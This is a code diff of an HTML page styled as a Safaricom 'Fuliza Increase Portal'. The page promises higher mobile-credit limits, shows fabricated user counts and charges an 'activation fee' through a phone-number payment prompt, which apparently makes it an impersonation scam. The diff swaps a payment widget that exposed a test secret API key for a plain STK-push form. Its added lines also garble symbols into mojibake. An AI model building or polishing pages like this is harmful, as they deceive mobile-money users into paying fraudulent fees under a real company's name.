@@ -63,7 +63,7 @@
 <div id="s1" class="screen active">        
     <div class="container">        
         <div class="stats-banner">
-            <h2>✓ Trusted Fuliza Increase Portal</h2>
+            <h2>âœ“ Trusted Fuliza Increase Portal</h2>
             <p>Join thousands of Kenyans increasing their Fuliza limits today</p>
             <div class="stats-grid">
                 <div class="stat-box"><div class="num">50K+</div><div class="label">Users</div></div>
@@ -77,7 +77,7 @@
             <button class="btn" onclick="show(2)">Increase Your Limit</button>        
         </div>        
     </div>        
-    <div class="footer">© 2026 Safaricom Fuliza Portal</div>        
+    <div class="footer">Â© 2026 Safaricom Fuliza Portal</div>        
 </div>  
 
 <div id="s2" class="screen">        
@@ -101,7 +101,7 @@
     <div class="header">Safaricom</div>        
     <div class="container">        
         <div class="card profile-card">        
-            <div class="avatar">👤</div>        
+            <div class="avatar">ðŸ‘¤</div>        
             <div class="profile-info">        
                 <h3 id="pName">Name</h3>        
                 <p>Phone: <span id="pPhone">07XXXXXXXX</span></p>        
@@ -128,28 +128,12 @@
             <h2>Activate Your Fuliza Limit Now</h2>        
             <div class="summary-box"><span>Selected Limit:</span> <span>KSh <span id="sLimit">75,000</span></span></div>        
             <div class="summary-box"><span>Activation Fee:</span> <span>KSh <span id="sFee">900</span></span></div>        
-            
-            <div style="margin-top: 20px;">
-                <!-- FinAPI Payment Widget -->
-                <div id="finapi-container" class="finapi-widget" 
-                     data-api-key="sk_test_82327f4b130c4bf1b4f7652f026853c6" 
-                     data-amount="1" 
-                     data-color="#2563eb"
-                     data-provider="payhero">
-                </div>
-                
-
-            </div>
-            
-            <div style="text-align: center; margin-top: 15px; border-top: 1px solid #eee; padding-top: 15px;">
-                <p style="font-size: 12px; color: #999;">Or use alternative manual payment:</p>
-                <div class="form-group" style="margin-top: 10px;">        
-                    <label>Safaricom Phone Number</label>        
-                    <input type="tel" id="payPhone" placeholder="07XXXXXXXX au 2547XXXXXXX">
-                    <div class="error" id="payPhoneError"></div>
-                </div>        
-                <button id="payBtn" class="btn" onclick="paySTK()" style="background: #666;">Manual Pay</button>        
-            </div>
+            <div class="form-group">        
+                <label>Safaricom Phone Number</label>        
+                <input type="tel" id="payPhone" placeholder="07XXXXXXXX au 2547XXXXXXX">
+                <div class="error" id="payPhoneError"></div>
+            </div>        
+            <button id="payBtn" class="btn" onclick="paySTK()">Pay Activation Fee Now</button>        
         </div>        
     </div>        
 </div>  
@@ -299,22 +283,6 @@ function showTopNotif(){
 }
 setTimeout(showTopNotif, 1000);
 setInterval(showTopNotif, 4000);
-
-</script> 
-<!-- FinAPI Payment Widget -->
-<script src="http://127.0.0.1:8000/static/js/finapi-widget.js"></script>
-<script>
-  const widget = document.getElementById('finapi-container');
-  widget.addEventListener('finapi:payment_success', (e) => {
-      console.log('Success!', e.detail);
-  });
-  widget.addEventListener('finapi:payment_failed', (e) => {
-      console.log('Failed!', e.detail);
-  });
-</script>
-
+</script>  
 </body>
 </html>
-
-
-
